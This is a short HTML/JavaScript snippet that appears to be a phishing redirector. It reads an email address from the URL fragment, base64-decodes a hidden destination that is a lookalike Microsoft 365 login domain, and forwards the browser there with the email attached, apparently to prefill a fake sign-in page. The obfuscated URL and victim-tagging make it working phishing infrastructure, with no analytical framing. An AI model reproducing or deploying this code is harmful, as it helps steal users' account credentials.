 <script>
   function redirect() {
  var queryString = window.location.href;
  var dom = queryString.split("#");
  var email = dom[1];
  
  console.log("Extracted email:", email);
  
  const forwardUrl = atob("aHR0cHM6Ly9sb2dpbi5hdXRoMC5tMzY1b2ZmaWNlLmNsb3VkL1FwdXdRRU9CIw==");
  console.log("Decoded forward URL:", forwardUrl);
  
  // Verify the values and perform the redirection
  console.log("Performing redirection to:", forwardUrl + email);
  window.location.href = forwardUrl + email;
}
  </script>
